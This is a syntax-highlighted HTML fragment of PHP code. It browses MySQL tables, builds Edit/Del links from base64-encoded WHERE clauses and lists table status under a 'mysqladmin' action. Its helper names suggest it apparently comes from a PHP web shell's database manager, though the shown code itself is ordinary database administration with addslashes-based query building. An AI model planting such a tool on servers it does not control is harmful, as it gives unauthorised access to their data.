<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">break</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">where</span> .= $<span style="color: #ffeead;">tmp</span><span style="color: #ff9da4; font-weight: bold;">.</span>$<span style="color: #ffeead;">key</span>.<span style="color: #99ffff;">"='"</span>.<span style="color: #ffffff; background-color: #002451;">addslas</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">hes(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tmp</span> = <span style="color: #99ffff;">' AND '</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#35835;&#21462;&#35760;&#24405;&#29992;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">mn</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span>=&gt;$<span style="color: #ffeead;">inside</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">b1</span> .= <span style="color: #99ffff;">'&lt;td nowrap&gt;'</span>.<span style="color: #ffffff; background-color: #002451;">html_clean(</span>$<span style="color: #ffeead;">ins</span><span style="color: #ffeead; text-decoration: underline;">ide</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">where</span> = <span style="color: #ffffff; background-color: #002451;">base64_encode(</span>$<span style="color: #ffeead;">where</span>);

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">allowedit</span>) <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;&lt;a href="j</span><span style="color: #99ffff; text-decoration: underline;">avascript:editrecord(\'edit\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">b1</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">unset(</span>$<span style="color: #ffeead;">b1</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">allowedit</span>) <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fieldnum</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_num_fields(</span>$<span style="color: #ffeead;">result</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">i</span>=<span style="color: #ffffff; background-color: #002451;">0</span>;$<span style="color: #ffeead;">i</span>&lt;$<span style="color: #ffeead;">fieldnum</span>;$<span style="color: #ffeead;">i</span>++){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">name</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_field_name(</span>$<span style="color: #ffeead;">result</span>, $<span style="color: #ffeead;">i</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">type</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_field_type(</span>$<span style="color: #ffeead;">result</span>, $<span style="color: #ffeead;">i</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">len</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_field_len(</span>$<span style="color: #ffeead;">result</span>, $<span style="color: #ffeead;">i</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #99ffff; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #99ffff; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #99ffff; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">tbfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">multipage</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">break</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">case</span> <span style="color: #bbdaff;">2</span>:
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">ar</span> = <span style="color: #ffffff; background-color: #002451;">mysql_affected_rows(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;affected rows : &lt;b&gt;'</span>.$<span style="color: #ffeead;">ar</span>.<span style="color: #99ffff;">'&lt;/b&gt;&lt;/h2&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">break</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">query</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SHOW TABLE STATUS"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">table_num</span> = $<span style="color: #ffeead;">table_rows</span> = $<span style="color: #ffeead;">data_size</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tabledb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">table</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_array(</span>$<span style="color: #ffeead;">query</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">data_size</span> = $<span style="color: #ffeead;">data_size</span> + $<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Data_length'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">table_rows</span> = $<span style="color: #ffeead;">table_rows</span> + $<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Rows'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Data_length'</span>] = <span style="color: #ffffff; background-color: #002451;">sizecount(</span>$<span style="color: #ffeead;">table</span>[<span style="color: #99ffff;">'Data_length'</span>]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">table_num</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tabledb</span>[] = $<span style="color: #ffeead;">table</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">data_size</span> = <span style="color: #ffffff; background-color: #002451;">sizecount(</span>$<span style="color: #ffeead;">data_size</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">unset(</span>$<span style="color: #ffeead;">table</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;table border="0" cellpadding="0" cellspacing="0"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;form action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'" method="POST"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'mysqladmin'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">dbform</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">highver</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
